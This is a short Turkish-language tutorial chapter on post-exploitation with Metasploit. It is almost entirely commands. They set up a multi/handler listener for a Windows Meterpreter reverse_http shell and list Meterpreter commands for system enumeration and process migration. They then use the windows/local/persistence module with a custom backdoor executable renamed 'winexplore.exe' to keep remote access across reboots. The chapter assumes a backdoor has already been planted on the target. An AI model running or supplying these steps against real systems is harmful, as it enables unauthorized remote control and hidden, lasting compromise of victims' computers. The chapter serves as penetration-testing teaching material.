
# Bölüm 19: Hackledikten Sonrası

> Not: Bu işlemleri gerçekleştirebilmek için hedef bilgisayara önceden bir **backdoor** yerleştirilmiş olması gerekir.

---

## 🎯 Meterpreter Oturumu Başlatma

```bash
msfconsole

use exploit/multi/handler

show options

set PAYLOAD windows/meterpreter/reverse_http

set LHOST 10.0.2.15

exploit
```

Oturum açıldığında mevcut bağlantıları görüntülemek için:

```bash
sessions -l
sessions -1
```

### Meterpreter İçinden Komutlar

```bash
meterpreter > ls                 # Dosya ve dizinleri listeler
meterpreter > background         # Oturumu arka plana alır
meterpreter > sysinfo            # Sistem bilgilerini listeler
meterpreter > help               # Tüm komutları gösterir
meterpreter > ps                 # Çalışan işlemleri listeler
meterpreter > migrate 2824       # Belirli bir işlem ID’sine geçiş
```

---

## 🔁 Bağlantıyı Kalıcı Hale Getirmek (Persistence)

```bash
meterpreter > background

use exploit/windows/local/persistence

show options

set EXE_NAME winexplore.exe

show advanced

set EXE::Custom var/www/html/backdoors/kirk_newpayload.exe

exploit

set PAYLOAD windows/meterpreter/reverse_http
```

---

## 📌 Özet

- `multi/handler` ile bağlantı beklenir
- Meterpreter ile hedef sistem yönetilir
- `migrate`, `sysinfo`, `ps` gibi komutlarla sistemde gezilir
- `windows/local/persistence` modülü ile bağlantı kalıcı hale getirilir
